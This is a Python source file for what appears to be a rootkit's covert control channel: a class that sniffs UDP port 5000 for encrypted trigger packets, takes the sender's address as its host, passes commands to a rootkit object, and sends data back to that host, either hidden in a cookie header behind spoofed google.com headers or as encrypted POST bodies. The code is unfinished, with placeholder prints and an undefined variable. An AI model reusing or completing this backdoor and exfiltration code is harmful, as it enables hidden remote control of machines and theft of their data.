import socket

import requests
from scapy.all import *
import webbrowser

from scapy.layers.inet import IP

from encryption import encryption


class remote_receiver:
    def __init__(self, code, key, rkit):
        self.rkit = rkit
        self.code = code
        self.key = key
        conf.use_pcap = True
        self.encrypter = encryption(key)
        self.host = ''

    def exfiltrate_output(self, data):
        headers = {
            'Host': 'www.google.com',
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'zh-cn',
            'Accept-Charset': 'GB2312, utf-8;q=0.7,*;q=0.7',
            'User-Agent': webbrowser.get().name,
            'Keep-Alive': '115',
            'Referer': 'http://www.google.com',
            'cookie': data

        }
        session = requests.Session()
        session.get(("http://" + self.host), headers=headers)
        data_bytes = bytes(data, 'UTF-8')
        data_len = len(data_bytes)

        print("exfiltrate here")

    def exfiltrate(self, data, opt):
        print("SEND POST REQUEST WITH ENCRYPTED DATA IN PAYLOAD. NO SIZE LIMIT")
        print("Send 404 or 505 as response")
        requests.post("http://" + self.host, cookies=opt, data=data)

    def listen_loop(self):
        sniff(filter="udp and port 5000", prn=self.packet_handler)

    def packet_handler(self, captured_packet):
        main_payload = captured_packet[0].payload
        encrypted_data = main_payload.payload.payload
        decrypted_data = str(self.encrypter.decrypt(encrypted_data))
        if code in decrypted_data:
            print("code found")
        else:
            print("code not found")
            return
        payload_id = main_payload.id
        command = payload_id % 10
        self.host = main_payload[IP].src
        self.rkit.action_parse()
        print("handle packet")
